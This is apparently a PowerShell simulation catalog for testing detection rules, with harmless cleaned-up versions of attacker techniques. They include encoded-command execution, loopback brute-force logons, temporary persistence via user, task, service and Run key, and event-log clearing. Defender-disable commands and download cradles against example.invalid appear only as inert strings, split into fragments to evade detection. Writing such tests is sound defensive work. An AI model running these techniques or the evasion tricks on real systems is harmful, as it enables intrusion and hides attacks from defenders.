# Simulation catalog shared by Invoke-Simulations.ps1 and Invoke-DetectionTest.ps1.
# Every simulation is benign and cleans up after itself. Strings that rules look for (Defender tampering, download
# cradles, base64 decode+execute) are assembled at runtime from fragments, so the *source file* does not contain
# them: only the script block that really runs does. Blocks created in-process also get a random trailing comment:
# in testing, PowerShell did not log a second run of identical script text in the same process, so each run must be unique. Otherwise script block logging would record this file and the
# rules would "detect" the catalog itself, which would make the test results meaningless.

function New-EncodedCase([string]$Flag, [string]$Command = 'Write-Output "psvigil simulation"') {
    [scriptblock]::Create(@"
`$b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('$Command'))
& powershell.exe -NoProfile $Flag `$b64 | Out-Null
"@)
}

$RuntimeDecode = [scriptblock]::Create(@'
$f = 'From' + 'Base64' + 'String'
$x = 'i' + 'ex'
$b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Write-Output "psvigil simulation"'))
$cmd = "$x ([Text.Encoding]::Unicode.GetString([Convert]::$f('$b64')))"
& powershell.exe -NoProfile -Command $cmd | Out-Null
'@)

$Catalog = [ordered]@{

    # ---- basic: one clear example per technique (what "-Run All" executes)
    EncodedPowerShell = @{ Group = 'basic'; Technique = 'T1059.001'; Rules = @('VGL-0001'); Desc = 'Runs a harmless -EncodedCommand'
        Script = (New-EncodedCase '-EncodedCommand') }
    BruteForce = @{ Group = 'basic'; Technique = 'T1110'; Rules = @('VGL-0002'); Desc = '6 failed logons against \\127.0.0.1 with a fake account'
        Script = {
            # cmd.exe does the redirection so PowerShell never sees native stderr (it would abort under -ErrorAction Stop)
            1..6 | ForEach-Object { & cmd.exe /c ('net use \\127.0.0.1\IPC$ /user:vgl_no_such_user BadPass' + $_ + '! >nul 2>&1') }
            & cmd.exe /c 'net use \\127.0.0.1\IPC$ /delete >nul 2>&1'
        } }
    NewLocalUser = @{ Group = 'basic'; Technique = 'T1136.001'; Rules = @('VGL-0003'); Desc = 'Creates then deletes local user vgl_sim_user'
        Script = {
            $pw = ConvertTo-SecureString ([guid]::NewGuid().ToString() + 'aA1!') -AsPlainText -Force
            New-LocalUser -Name 'vgl_sim_user' -Password $pw -Description 'PSVigil simulation' | Out-Null
            Start-Sleep -Seconds 2
            Remove-LocalUser -Name 'vgl_sim_user'
        } }
    ScheduledTask = @{ Group = 'basic'; Technique = 'T1053.005'; Rules = @('VGL-0004'); Desc = 'Registers then removes a scheduled task'
        Script = {
            $act = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c echo psvigil'
            $trg = New-ScheduledTaskTrigger -Once -At (Get-Date).AddDays(1)
            Register-ScheduledTask -TaskName 'PSVigilSim' -Action $act -Trigger $trg | Out-Null
            Start-Sleep -Seconds 2
            Unregister-ScheduledTask -TaskName 'PSVigilSim' -Confirm:$false
        } }
    NewService = @{ Group = 'basic'; Technique = 'T1543.003'; Rules = @('VGL-0005'); Desc = 'Installs then deletes a (never started) service'
        Script = {
            New-Service -Name 'PSVigilSim' -BinaryPathName 'C:\Windows\System32\cmd.exe /c echo psvigil' | Out-Null
            Start-Sleep -Seconds 2
            & sc.exe delete PSVigilSim | Out-Null
        } }
    RunKey = @{ Group = 'basic'; Technique = 'T1547.001'; Rules = @('VGL-0006'); NeedsSysmon = $true; Desc = 'Adds then removes a HKCU Run value (detected only with Sysmon)'
        Script = {
            $k = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
            New-ItemProperty -Path $k -Name 'PSVigilSim' -Value 'cmd.exe /c echo psvigil' -PropertyType String -Force | Out-Null
            Start-Sleep -Seconds 2
            Remove-ItemProperty -Path $k -Name 'PSVigilSim'
        } }
    DefenderTamper = @{ Group = 'basic'; Technique = 'T1562.001'; Rules = @('VGL-0009'); Desc = 'Script block that CONTAINS (never runs) a Defender-disable command'
        Script = {
            $text = 'Set-Mp' + 'Preference -DisableRealtimeMonitoring $true'
            & ([scriptblock]::Create("`$null = '$text' # $([guid]::NewGuid())"))
        } }
    DownloadCradle = @{ Group = 'basic'; Technique = 'T1105'; Rules = @('VGL-0011'); Desc = 'Script block that CONTAINS (never runs) a download cradle'
        Script = {
            $text = '(New-Object Net.WebClient).Down' + 'loadString(' + "'http://example.invalid/payload.ps1')"
            & ([scriptblock]::Create("`$null = `"$text`" # $([guid]::NewGuid())"))
        } }
    LogCleared = @{ Group = 'basic'; Technique = 'T1070.001'; Rules = @('VGL-0008'); Confirm = $true; Desc = 'Clears the Application event log (lab only, asks first)'
        Script = { & wevtutil.exe cl Application } }

    # ---- variants: evasion attempts against the rules above
    'EncodedPowerShell-enc' = @{ Group = 'variants'; Technique = 'T1059.001'; Rules = @('VGL-0001'); Desc = 'Short switch -enc'
        Script = (New-EncodedCase '-enc') }
    'EncodedPowerShell-ec' = @{ Group = 'variants'; Technique = 'T1059.001'; Rules = @('VGL-0001'); Desc = 'Alias -ec'
        Script = (New-EncodedCase '-ec') }
    'EncodedPowerShell-e' = @{ Group = 'variants'; Technique = 'T1059.001'; Rules = @('VGL-0001'); Desc = 'Shortest form -e'
        Script = (New-EncodedCase '-e') }
    'EncodedPowerShell-upper' = @{ Group = 'variants'; Technique = 'T1059.001'; Rules = @('VGL-0001'); Desc = 'Upper-case -ENCODEDCOMMAND'
        Script = (New-EncodedCase '-ENCODEDCOMMAND') }
    'EncodedPowerShell-short' = @{ Group = 'variants'; Technique = 'T1059.001'; Rules = @('VGL-0001'); Desc = 'Tiny payload (8 base64 chars) to dodge length thresholds'
        Script = (New-EncodedCase '-enc' 'ls') }
    'RuntimeDecode' = @{ Group = 'variants'; Technique = 'T1027'; Rules = @('VGL-0012'); Desc = 'No -enc switch: decode base64 in-line and execute'
        Script = $RuntimeDecode }
    'DefenderTamper-exclusion' = @{ Group = 'variants'; Technique = 'T1562.001'; Rules = @('VGL-0009'); Desc = 'Exclusion path variant (never runs)'
        Script = {
            $text = 'Add-Mp' + 'Preference -ExclusionPath C:\Temp'
            & ([scriptblock]::Create("`$null = '$text' # $([guid]::NewGuid())"))
        } }
    'DownloadCradle-iwr' = @{ Group = 'variants'; Technique = 'T1105'; Rules = @('VGL-0011'); Desc = 'iwr | iex style cradle (never runs)'
        Script = {
            $text = 'i' + 'wr http://example.invalid/p.ps1 | i' + 'ex'
            & ([scriptblock]::Create("`$null = `"$text`" # $([guid]::NewGuid())"))
        } }
}

# ---- chains: several steps in order, to exercise the correlation rules
function Join-Script([string[]]$Names) {
    [scriptblock]::Create((($Names | ForEach-Object { $Catalog[$_].Script.ToString() }) -join "`n"))
}
$Catalog['Chain-Persistence'] = @{ Group = 'chains'; Technique = 'T1136'; Rules = @('VGL-0102'); Desc = 'New user, then scheduled task, then service'
    Script = (Join-Script 'NewLocalUser', 'ScheduledTask', 'NewService') }
$Catalog['Chain-ExecEvasion'] = @{ Group = 'chains'; Technique = 'T1059'; Rules = @('VGL-0103'); Desc = 'Encoded PowerShell, then Defender tamper string'
    Script = (Join-Script 'EncodedPowerShell', 'DefenderTamper') }
$Catalog['Chain-BruteForceSuccess'] = @{ Group = 'chains'; Technique = 'T1110.001'; Rules = @('VGL-0101'); Desc = '6 failed logons then a good one for a temp local user (source IP must match; may vary by Windows version)'
    Script = {
        $pass = [guid]::NewGuid().ToString() + 'aA1!'
        Remove-LocalUser -Name 'vgl_bf_user' -ErrorAction SilentlyContinue    # leftover from an interrupted earlier run
        New-LocalUser -Name 'vgl_bf_user' -Password (ConvertTo-SecureString $pass -AsPlainText -Force) | Out-Null
        try {
            1..6 | ForEach-Object { & cmd.exe /c ('net use \\127.0.0.1\IPC$ /user:vgl_bf_user WrongPass' + $_ + '! >nul 2>&1') }
            & cmd.exe /c ('net use \\127.0.0.1\IPC$ /user:vgl_bf_user ' + $pass + ' >nul 2>&1')
            & cmd.exe /c 'net use \\127.0.0.1\IPC$ /delete >nul 2>&1'
        }
        finally { Remove-LocalUser -Name 'vgl_bf_user' -ErrorAction SilentlyContinue }
    } }